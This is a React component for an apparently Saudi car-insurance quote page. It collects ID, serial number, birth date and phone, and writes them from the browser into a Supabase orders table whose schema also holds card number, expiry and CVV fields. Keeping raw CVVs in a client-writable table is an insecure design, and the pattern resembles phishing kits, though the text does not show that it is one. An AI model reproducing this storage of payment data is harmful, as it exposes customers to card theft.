import { Shield } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Checkbox } from "@/components/ui/checkbox";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import DatePicker from "@/components/DatePicker";
import { useOrder } from "@/contexts/OrderContext";
import { supabase } from "@/integrations/supabase/client";
import { format } from "date-fns";
import { toast } from "sonner";
import heroBanner from "@/assets/hero-banner.png";

const Hero = () => {
  const navigate = useNavigate();
  const { updateOrderData } = useOrder();
  const [idNumber, setIdNumber] = useState("");
  const [sequenceNumber, setSequenceNumber] = useState("");
  const [birthDate, setBirthDate] = useState<Date>();
  const [transferBirthDate, setTransferBirthDate] = useState<Date>();
  const [cardType, setCardType] = useState<"form" | "customs" | null>(null);
  const [transferCardType, setTransferCardType] = useState<"form" | "customs" | null>(null);
  const [phoneNumber, setPhoneNumber] = useState("");
  const [transferPhoneNumber, setTransferPhoneNumber] = useState("");

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>, isTransfer = false) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (!value.startsWith('05')) {
      value = '05';
    }
    
    if (value.length > 10) {
      value = value.slice(0, 10);
    }
    
    if (isTransfer) {
      setTransferPhoneNumber(value);
    } else {
      setPhoneNumber(value);
    }
  };

  const handleNext = async () => {
    if (!idNumber || !sequenceNumber || !birthDate) {
      toast.error("يرجى ملء جميع الحقول المطلوبة");
      return;
    }

    if (phoneNumber.length !== 10 || !phoneNumber.startsWith('05')) {
      toast.error("رقم الهاتف يجب أن يبدأ بـ 05 ويتكون من 10 أرقام");
      return;
    }

    const formattedBirthDate = format(birthDate, "yyyy-MM-dd");
    
    // Update context
    updateOrderData({
      idNumber,
      sequenceNumber,
      birthDate: formattedBirthDate,
    });

    // Check if order exists, if not create it
    try {
      const { data: existingOrder } = await supabase
        .from("customer_orders")
        .select("id")
        .eq("sequence_number", sequenceNumber)
        .maybeSingle();

      if (!existingOrder) {
        // Insert new order
        await supabase
          .from("customer_orders")
          .insert({
            id_number: idNumber,
            sequence_number: sequenceNumber,
            birth_date: formattedBirthDate,
            vehicle_type: "",
            vehicle_purpose: "",
            insurance_company: "",
            insurance_price: 0,
            card_number: "",
            card_holder_name: "",
            expiry_date: "",
            cvv: "",
            status: "pending",
          });
      } else {
        // Update existing order
        await supabase
          .from("customer_orders")
          .update({
            id_number: idNumber,
            birth_date: formattedBirthDate,
          })
          .eq("sequence_number", sequenceNumber);
      }
    } catch (error) {
      console.error("Error saving order:", error);
    }

    navigate("/vehicle-info");
  };

  return (
    <div className="relative min-h-screen bg-white overflow-hidden">
      {/* Hero Banner Section */}
      <div className="relative w-full bg-gradient-to-r from-blue-50 to-white">
        <div className="container mx-auto px-4">
          <div className="relative">
            <img 
              src={heroBanner} 
              alt="أول منصة لتأمين السيارات في السعودية" 
              className="w-full h-auto object-cover"
            />
          </div>
        </div>
      </div>


      {/* Form Section */}
      <div className="container mx-auto px-4 py-12">
        <div className="max-w-2xl mx-auto animate-scale-in">
          <div className="bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
            <Tabs defaultValue="new" dir="rtl" className="w-full">
              <TabsList className="grid w-full grid-cols-2 mb-6">
                <TabsTrigger value="new" className="text-base">تأمين جديد</TabsTrigger>
                <TabsTrigger value="transfer" className="text-base">نقل ملكية</TabsTrigger>
              </TabsList>
              
              <TabsContent value="new" className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="id-number" className="text-base">رقم الهوية / الإقامة الخاص بك</Label>
                  <Input 
                    id="id-number" 
                    type="text" 
                    placeholder=""
                    maxLength={10}
                    pattern="[0-9]*"
                    inputMode="numeric"
                    className="h-12 text-base"
                    value={idNumber}
                    onChange={(e) => setIdNumber(e.target.value)}
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="owner-name" className="text-base">اسم مالك الوثيقة كاملاً</Label>
                  <Input 
                    id="owner-name" 
                    type="text" 
                    placeholder=""
                    className="h-12 text-base"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="phone" className="text-base">رقم الهاتف</Label>
                  <Input 
                    id="phone" 
                    type="tel" 
                    placeholder="05xxxxxxxx"
                    value={phoneNumber}
                    onChange={(e) => handlePhoneChange(e, false)}
                    maxLength={10}
                    inputMode="numeric"
                    className="h-12 text-base"
                    required
                  />
                </div>

                <DatePicker
                  label="تاريخ الميلاد"
                  value={birthDate}
                  onChange={setBirthDate}
                />

                <div className="space-y-2">
                  <Label className="text-base">نوع البطاقة</Label>
                  <div className="grid grid-cols-2 gap-4">
                    <Button 
                      type="button"
                      variant={cardType === "form" ? "default" : "outline"}
                      className="h-12 text-base"
                      onClick={() => setCardType("form")}
                    >
                      استمارة
                    </Button>
                    <Button 
                      type="button"
                      variant={cardType === "customs" ? "default" : "outline"}
                      className="h-12 text-base"
                      onClick={() => setCardType("customs")}
                    >
                      بطاقة جمركية
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="serial" className="text-base">الرقم التسلسلي / بطاقة جمركية</Label>
                  <Input 
                    id="serial" 
                    type="text" 
                    placeholder="000000000"
                    className="h-12 text-base text-center"
                    value={sequenceNumber}
                    onChange={(e) => setSequenceNumber(e.target.value)}
                  />
                </div>

                <div className="flex items-start space-x-2 space-x-reverse">
                  <Checkbox id="terms" />
                  <label
                    htmlFor="terms"
                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
                  >
                    أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                  </label>
                </div>

                <Button 
                  type="button"
                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90" 
                  size="lg"
                  onClick={handleNext}
                >
                  التالي
                </Button>
              </TabsContent>

              <TabsContent value="transfer" className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="transfer-id-number" className="text-base">رقم الهوية / الإقامة الخاص بك</Label>
                  <Input 
                    id="transfer-id-number" 
                    type="text" 
                    placeholder=""
                    maxLength={10}
                    pattern="[0-9]*"
                    inputMode="numeric"
                    className="h-12 text-base"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="transfer-owner-name" className="text-base">اسم مالك الوثيقة كاملاً</Label>
                  <Input 
                    id="transfer-owner-name" 
                    type="text" 
                    placeholder=""
                    className="h-12 text-base"
                  />
                </div>

                <div className="space-y-2">
                  <Label htmlFor="transfer-phone" className="text-base">رقم الهاتف</Label>
                  <Input 
                    id="transfer-phone" 
                    type="tel" 
                    placeholder="05xxxxxxxx"
                    value={transferPhoneNumber}
                    onChange={(e) => handlePhoneChange(e, true)}
                    maxLength={10}
                    inputMode="numeric"
                    className="h-12 text-base"
                    required
                  />
                </div>

                <DatePicker
                  label="تاريخ الميلاد"
                  value={transferBirthDate}
                  onChange={setTransferBirthDate}
                />

                <div className="space-y-2">
                  <Label className="text-base">نوع البطاقة</Label>
                  <div className="grid grid-cols-2 gap-4">
                    <Button 
                      type="button"
                      variant={transferCardType === "form" ? "default" : "outline"}
                      className="h-12 text-base"
                      onClick={() => setTransferCardType("form")}
                    >
                      استمارة
                    </Button>
                    <Button 
                      type="button"
                      variant={transferCardType === "customs" ? "default" : "outline"}
                      className="h-12 text-base"
                      onClick={() => setTransferCardType("customs")}
                    >
                      بطاقة جمركية
                    </Button>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="transfer-serial" className="text-base">الرقم التسلسلي / بطاقة جمركية</Label>
                  <Input 
                    id="transfer-serial" 
                    type="text" 
                    placeholder="000000000"
                    className="h-12 text-base text-center"
                  />
                </div>

                <div className="flex items-start space-x-2 space-x-reverse">
                  <Checkbox id="transfer-terms" />
                  <label
                    htmlFor="transfer-terms"
                    className="text-sm text-muted-foreground leading-relaxed cursor-pointer"
                  >
                    أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي
                  </label>
                </div>

                <Button 
                  type="button"
                  className="w-full h-12 text-lg font-semibold bg-accent hover:bg-accent/90" 
                  size="lg"
                  onClick={handleNext}
                >
                  التالي
                </Button>
              </TabsContent>
            </Tabs>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Hero;
